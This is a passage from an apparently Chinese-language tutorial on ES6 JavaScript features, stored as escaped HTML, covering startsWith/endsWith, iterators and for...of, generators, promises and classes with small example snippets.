class=\"hljs-subst\"\u003e${src}\u003c/span\u003e\" /\u0026gt;\u0026lt;/div\u0026gt;`\u003c/span\u003e;\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e往往这样子的元素在手动拼接的过程中，总是会出错，因此，使用模版字符串是一种既「高效」又「简洁」的方式。\u003c/p\u003e\n\u003cp\u003e有了模版字符串，你可以解决非常棘手的问题。那么，标题中带有的startsWith和endsWith又是起到什么作用呢？可能你会使用正则表达式，那么你就有可能不会使用到这两个API。\u003c/p\u003e\n\u003cp\u003e按照惯例，还是需要来介绍一下这两个API的。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003estartsWith\u003c/strong\u003e：返回值为boolean型，然后去匹配字符串开头的部分，举个例子：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e str = \u003cspan class=\"hljs-string\"\u003e\"start in the head\"\u003c/span\u003e;\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(str.startsWith(\u003cspan class=\"hljs-string\"\u003e'start'\u003c/span\u003e));  \u003cspan class=\"hljs-comment\"\u003e//true\u003c/span\u003e\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(str.startsWith(\u003cspan class=\"hljs-string\"\u003e'head'\u003c/span\u003e));  \u003cspan class=\"hljs-comment\"\u003e//false\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e其实，这也是可以使用正则表达式来达到这一目的。还原上例：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e str = \u003cspan class=\"hljs-string\"\u003e\"start in the head\"\u003c/span\u003e;\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-regexp\"\u003e/^start/\u003c/span\u003e.test(str));   \u003cspan class=\"hljs-comment\"\u003e//true\u003c/span\u003e\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-regexp\"\u003e/^head/\u003c/span\u003e.test(str));   \u003cspan class=\"hljs-comment\"\u003e//false\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e其实，两者方式的区别基本上没有，但是正则表达式的功能更佳的完善。这个API仅仅在一些场景下起到一定的便捷。比方说，我们需要去匹配一个URL的协议头是什么时，我们往往需要用到这种方式。例子：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e url = \u003cspan class=\"hljs-string\"\u003e\"http://www.example.com\"\u003c/span\u003e;\n\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(url.startsWith(\u003cspan class=\"hljs-string\"\u003e'http'\u003c/span\u003e)){\n    \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e'this is http'\u003c/span\u003e);\n}\u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(url.startsWith(\u003cspan class=\"hljs-string\"\u003e'https'\u003c/span\u003e)){\n    \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e'this is https'\u003c/span\u003e);\n}\u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(url.startsWith(\u003cspan class=\"hljs-string\"\u003e'ws'\u003c/span\u003e)){\n    \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e'this is websocket'\u003c/span\u003e);\n}    \u003cspan class=\"hljs-comment\"\u003e//this is http\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e同理，endWith也是一样的效果。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eendsWith\u003c/strong\u003e：返回值是boolean类型，然后去匹配字符串的结尾。举个例子：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e str = \u003cspan class=\"hljs-string\"\u003e\"something in the end\"\u003c/span\u003e;\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(str.endsWith(\u003cspan class=\"hljs-string\"\u003e'end'\u003c/span\u003e));   \u003cspan class=\"hljs-comment\"\u003e//true\u003c/span\u003e\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(str.endsWith(\u003cspan class=\"hljs-string\"\u003e'something'\u003c/span\u003e));  \u003cspan class=\"hljs-comment\"\u003e//false\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e同样的，它也可以使用正则表达式来实现：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e str = \u003cspan class=\"hljs-string\"\u003e\"something in the end\"\u003c/span\u003e;\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-regexp\"\u003e/end$/\u003c/span\u003e.test(str));   \u003cspan class=\"hljs-comment\"\u003e//true\u003c/span\u003e\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-regexp\"\u003e/something$/\u003c/span\u003e.test(str));   \u003cspan class=\"hljs-comment\"\u003e//false\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这种情况的使用场景是，往往我们需要为上传的文件准备图标，那么我们就可以根据后缀来确定图标。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e filename = \u003cspan class=\"hljs-string\"\u003e\"upload.jpg\"\u003c/span\u003e;\n\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(filename.endsWith(\u003cspan class=\"hljs-string\"\u003e'.jpg'\u003c/span\u003e)){\n    \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e'this is jpg file'\u003c/span\u003e);\n}\u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(filename.endsWith(\u003cspan class=\"hljs-string\"\u003e'.png'\u003c/span\u003e)){\n    \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e'this is png file'\u003c/span\u003e);\n}\u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(filename.endsWith(\u003cspan class=\"hljs-string\"\u003e'.webp'\u003c/span\u003e)){\n    \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e'this is webp file'\u003c/span\u003e);\n}   \u003cspan class=\"hljs-comment\"\u003e//this is jpg file\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e同时，字符串还增加了许许多多的东西，有兴趣的，可以自己去翻书本详细的了解\u003c/p\u003e\n\u003ch3 id=\"iterator-for-of\"\u003eIterator和for...of\u003c/h3\u003e\n\u003cp\u003eIterator的概念是迭代器。在ES6中，终于正式的添加了这个属性。迭代器，主要是一个集合类元素的遍历机制。何为集合类元素？最常见的就是数组，还有对象。迭代器可以帮助开发者完成遍历集合的过程。最开始javascript并没有设置接口，来自定义迭代器，但是从ES6开始，我们可以自定义迭代器了。在自定义迭代器之前，我们要清楚迭代器的作用有哪些：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e为各种数据结构提供一个统一的、简便的访问接口\u003c/li\u003e\n\u003cli\u003e使得数据结构的成员能够按某种次序排列\u003c/li\u003e\n\u003cli\u003e在ES6中，迭代器主要供我们之后要讲述的for...of服务\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e迭代器，往往就是一个指针对象，不断调用，然后不断地指向下一个对象的过程，直到结束。ES6中，我们可以创建一个指针对象，然后调用next的函数，使得指针对象向下移动。同时，next函数会返回value和done，确定是否到达末尾。\u003c/p\u003e\n\u003cp\u003e同时，ES6还提供了Iterator接口——Symbol.iterator。首先，我们来看一下具备原生接口的集合类——数组，类数组对象、Set和Map。这样我们就可以直接调用它的接口来进行循环：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e arr = [\u003cspan class=\"hljs-string\"\u003e'my'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'name'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'is'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'iterator'\u003c/span\u003e];\n\u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e iter = arr[\u003cspan class=\"hljs-built_in\"\u003eSymbol\u003c/span\u003e.iterator]();\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(iter.next());   \u003cspan class=\"hljs-comment\"\u003e//{ value: 'my', done: false}\u003c/span\u003e\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(iter.next());   \u003cspan class=\"hljs-comment\"\u003e//{ value: 'name', done: false}\u003c/span\u003e\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(iter.next());   \u003cspan class=\"hljs-comment\"\u003e//{ value: 'is', done: false}\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e同时，定义iterator接口的数据结构可以轻松的使用for...of进行值的遍历\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e arr = [\u003cspan class=\"hljs-string\"\u003e'I'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'has'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'iterator'\u003c/span\u003e];\n\u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e(\u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e item \u003cspan class=\"hljs-keyword\"\u003eof\u003c/span\u003e arr){\n    \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(item);\n}   \u003cspan class=\"hljs-comment\"\u003e//'I', 'has', 'iterator'\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e但是，如果没有定义iterator接口的数据结构就没有办法使用这种方式进行遍历，如图：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"iterator\" src=\"https://user-gold-cdn.xitu.io/2017/10/6/d76118ee074d298ec512916fb7cd1705\"\u003e\u003cfigcaption\u003eiterator\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e这时，我们又该如何呢？其实，针对一些可迭代的数据结构，我们是可以自定义迭代器的，例如：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e iteratorObj = {\n    \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'a'\u003c/span\u003e,\n      \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'b'\u003c/span\u003e,\n      \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'c'\u003c/span\u003e,\n      \u003cspan class=\"hljs-attr\"\u003elength\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e,\n     [\u003cspan class=\"hljs-built_in\"\u003eSymbol\u003c/span\u003e.iterator]: \u003cspan class=\"hljs-built_in\"\u003eArray\u003c/span\u003e.prototype[\u003cspan class=\"hljs-built_in\"\u003eSymbol\u003c/span\u003e.iterator]\n}\n\u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e(\u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e item \u003cspan class=\"hljs-keyword\"\u003eof\u003c/span\u003e iteratorObj){\n    \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(item);\n}  \u003cspan class=\"hljs-comment\"\u003e// 'a', 'b', 'c'\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e迭代器是一个非常实用的东西，不妨你也可以试试，同时去改善你的代码。\u003c/p\u003e\n\u003ch3 id=\"generator-promise\"\u003eGenerator和Promise\u003c/h3\u003e\n\u003cp\u003e其实，这两个是比较难以理解的东西。如果只是粗浅的了解一下，还是有许多的新东西的。在ES6中，引入了generator和promise两个概念。可能在这之前，你已经使用过了，通过其他的类库实现的。那么，其实ES6中的新概念也是差不多的，只是标准化了而已。\u003c/p\u003e\n\u003cp\u003egenerator，叫做生成器。可以说与iterator有点相似，同样是通过next函数，来一步步往下执行的。同时，它的定义时，所使用的是function*的标识符。还具备yield这个操作符，可以实现逐步逐步向下执行。我们来看个例子：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\"\u003e\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e* \u003cspan class=\"hljs-title\"\u003egenerator\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e)\u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003eyield\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e;\n  \u003cspan class=\"hljs-keyword\"\u003eyield\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e;\n  \u003cspan class=\"hljs-keyword\"\u003eyield\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e;\n};\n\n\u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e generate = generator();\n\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(generate.next());  \u003cspan class=\"hljs-comment\"\u003e//{value: 1, done: false}\u003c/span\u003e\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(generate.next());  \u003cspan class=\"hljs-comment\"\u003e//{value: 2, done: false}\u003c/span\u003e\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(generate.next());  \u003cspan class=\"hljs-comment\"\u003e//{value: 3, done: true}\u003c/span\u003e\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(generate.next());  \u003cspan class=\"hljs-comment\"\u003e//{value: undefined, done: true}\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这样子看起来，似乎就是迭代器的步骤。其实，iterator的接口，可以定义成这样子的形式。但是，generator的作用不仅仅如此。它就像一个状态机，可以在上一个状态到下一个状态之间进行切换。而一旦遇到yield部分，则可以表示当前是可以步骤的暂停。需要等到调用next方法才能进行下一步骤。同时，我们还可以使用上一步的结果值，进行下一步的运算。示例：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\"\u003e\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e* \u003cspan class=\"hljs-title\"\u003egenerator\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e)\u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003eyield\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e;\n  \u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e value = \u003cspan class=\"hljs-keyword\"\u003eyield\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e;\n  \u003cspan class=\"hljs-keyword\"\u003eyield\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e + value;\n};\n\n\u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e generate = generator();\n\n\u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e value1 = generate.next();\n\u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e value2 = generate.next();\n\u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e value3 = generate.next(value2.value);\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(value1);  \u003cspan class=\"hljs-comment\"\u003e//{value: 1, done: false}\u003c/span\u003e\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(value2);  \u003cspan class=\"hljs-comment\"\u003e//{value: 2, done: false}\u003c/span\u003e\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(value3);  \u003cspan class=\"hljs-comment\"\u003e//{value: 5, done: true}\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这样的话，就可以将value作为你第三步的参数值，进行使用。\u003c/p\u003e\n\u003cp\u003e之前说过，generator的next是需要自己调用的。但是，我们如何使它自己自动调用呢。我们可以使用for...of来自动调用next，就像迭代器一样。示例：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\"\u003e\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e* \u003cspan class=\"hljs-title\"\u003egenerator\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e)\u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003eyield\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e;\n  \u003cspan class=\"hljs-keyword\"\u003eyield\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e;\n  \u003cspan class=\"hljs-keyword\"\u003eyield\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e;\n};\n\u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e(\u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e value \u003cspan class=\"hljs-keyword\"\u003eof\u003c/span\u003e generator()){\n  \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(value);\n}   \u003cspan class=\"hljs-comment\"\u003e//1, 2, 3\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e其实，之前所讲的只是generator的基本使用。generator主要被使用在异步编程领域。因为我们之前所讲的特性，非常适合在异步编程中使用。当然了，我们也需要去提一下promise这个异步编程的功臣。\u003c/p\u003e\n\u003cp\u003ePromise，翻译过来叫做承诺。我们可以理解为一种约定。大家都知道异步编程的时候，我们一般会使用到\u003cstrong\u003e回调函数\u003c/strong\u003e这个东西。但是，回调函数会导致的问题，也非常的明显。示例：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\"\u003ecallback1(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003edata\u003c/span\u003e)\u003c/span\u003e{\n    \u003cspan class=\"hljs-comment\"\u003e//...\u003c/span\u003e\n      callback2(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003edata1\u003c/span\u003e)\u003c/span\u003e{\n        \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e prevData = data;\n          \u003cspan class=\"hljs-comment\"\u003e//...\u003c/span\u003e\n          callback3(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e)\u003c/span\u003e{\n            \u003cspan class=\"hljs-comment\"\u003e//...\u003c/span\u003e\n              callback4(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e)\u003c/span\u003e{\n                \u003cspan class=\"hljs-comment\"\u003e//...\u003c/span\u003e\n            });\n        });\n    });\n});\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e回调函数，写多了之后我们会发现，这个倒金字塔会越来越深，而我们会越来越难以管理。\u003c/p\u003e\n\u003cp\u003e这时，或许promise会起到一定的作用。试想一下，为什么这几个回调函数都能在另一个回调函数之外进行？主要原因：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e每个回调函数，都会无法确定另一个回调函数会在何时会被调用，因为这个控制权不在当前这个程序之中。\u003c/li\u003e\n\u003cli\u003e每个回调函数，都或多或少的依赖于上一个回调函数执行的时间和数据\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e基于这两点，我们就会发现，一旦你需要这样去编写代码，就必须保证你的上一个回调函数在下一个回调函数之前进行。我们还可以发现，它们之间缺乏一种约定，就是一旦上一个发生了，无论是正确还是错误，都会通知对应的回调函数的约定。\u003c/p\u003e\n\u003cp\u003ePromise，或许就是起到了这样的一种作用。它具备三种状态：pending、resolved、rejected。它们之间分别对应：正在进行、已解决、已拒绝等三种结果。一个回调函数会开始从pending状态，它会向resolved和rejected的两者之一进行转换。而且这种转换是\u003cstrong\u003e不可变\u003c/strong\u003e的，即一旦你从pending状态转变到resolved状态，就不可以再变到rejected状态去了。\u003c/p\u003e\n\u003cp\u003e然后，promise会有一个then函数，可以向下传递之前回调函数返回的结果值。我们可以写个promise示例：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ePromise\u003c/span\u003e(\u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003eresolved, rejected\u003c/span\u003e) =\u0026gt;\u003c/span\u003e {\n  resolved(\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e);\n}).then(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003edata\u003c/span\u003e =\u0026gt;\u003c/span\u003e {\n  \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(data);\n}, err =\u0026gt; {\n  \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(err);\n}).catch(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003eerr\u003c/span\u003e =\u0026gt;\u003c/span\u003e {\n  \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(err);\n});  \u003cspan class=\"hljs-comment\"\u003e// 1\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e其实，只需要记住这样子的一种形式，就可以写好promise。Promise是一个比较容易书写的东西。因为它的形式比较单一，而且现在有许多封装的比较好的异步请求库，都带有Promise的属性，例如axios。\u003c/p\u003e\n\u003cp\u003ePromise，还带有其他的一些API，上面我们也使用到了一个。\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003ecatch：用于指定发生错误时的回调函数。主要是我们之前说过Promise有个不可变的特性，所以，一旦这一个过程中发生错误，但是状态无法转变，只能在下一个流程中去捕获这个错误。因此，为了预防最后一个流程发生错误，需要在最后使用catch去捕获最后一个流程中的错误。\u003c/li\u003e\n\u003cli\u003eall：用于将多个Promise实例包装成一个新的Promise实例。\u003cul\u003e\n\u003cli\u003e这个函数需要其中所有的Promise实例都变成Fulfilled时，才会将结果包装成一个数组传递给下一个Promise。\u003c/li\u003e\n\u003cli\u003e如果其中有一个Promise实例变成Rejected时，就会将第一个Rejected的结果传递给下一个Promise\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003erace：也是用于将多个Promise实例包装成一个新的Promise实例。但是这个函数有所不同\u003cul\u003e\n\u003cli\u003e如果这个函数中，有一个Promise变成Fulfilled时，它就会将结果传递给下一个Promise\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eresolve：它会将一个当前对象转化为Promise对象\u003c/li\u003e\n\u003cli\u003ereject：返回一个出错的Promise对象\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003ePromise可以和之前所讲的Generator一起使用，我们可以看一下使用场景：\u003c/p\u003e\n\u003cp\u003e通过Generator函数来管理流程，遇到异步操作，就使用Promise进行处理。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\"\u003e\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eusePromise\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e)\u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ePromise\u003c/span\u003e(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003eresolve\u003c/span\u003e =\u0026gt;\u003c/span\u003e {\n    resolve(\u003cspan class=\"hljs-string\"\u003e'my name is promise'\u003c/span\u003e);\n  });\n}\n\n\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e* \u003cspan class=\"hljs-title\"\u003egenerator\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e)\u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003etry\u003c/span\u003e{\n    \u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e item = \u003cspan class=\"hljs-keyword\"\u003eyield\u003c/span\u003e usePromise();\n    \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(item);\n  }\u003cspan class=\"hljs-keyword\"\u003ecatch\u003c/span\u003e(err){\n    \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(err);\n  }\n}\n\n\u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e generate = generator();\ngenerate.next().value.then(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003edata\u003c/span\u003e =\u0026gt;\u003c/span\u003e {\n  \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(data);\n}, err =\u0026gt; {\n  \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(err);\n}).catch(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003eerr\u003c/span\u003e =\u0026gt;\u003c/span\u003e {\n  \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(err);\n});   \u003cspan class=\"hljs-comment\"\u003e//my name is promise\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e或许，你还可以写出更加复杂的程序。\u003c/p\u003e\n\u003ch3 id=\"class-extends\"\u003eClass和extends\u003c/h3\u003e\n\u003cp\u003e最后要聊的一个主题就是class。相信抱怨javascript没有类的特性数不胜数。同时，还需要去了解js的类继承式概念。那么，ES6也带来了我们最欢迎的class module部分。我们就不介绍之前我们是如果去构建对象的了(好像是构造函数)。\u003c/p\u003e\n\u003cp\u003e那么，我们可以来看一下，ES6给我带来的新变化：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\"\u003e\u003cspan class=\"hljs-class\"\u003e\u003cspan class=\"hljs-keyword\"\u003eclass\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eAnimal\u003c/span\u003e\u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003econstructor\u003c/span\u003e(name){\n      \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.name = name;\n  }\n\n  sayName(){\n      \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.name;\n  }\n}\n\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e animal = \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e Animal(\u003cspan class=\"hljs-string\"\u003e'dog'\u003c/span\u003e);\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(animal.sayName());  \u003cspan class=\"hljs-comment\"\u003e// 'dog'\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e似乎这样子的形式比之前的构造函数的方式强对了。我们可以理解一下这个结构：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e其内部的constructor：指向的就是整个类的constructor\u003c/li\u003e\n\u003cli\u003e其内部的函数：这些函数的定义在类的原型上面\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e因此，上面那个其实可以写成原先的：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\"\u003e\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eAnimal\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003ename\u003c/span\u003e)\u003c/span\u003e{\n    \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.name = name;\n}\nAnimal.prototype.sayName = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e)\u003c/span\u003e{\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan 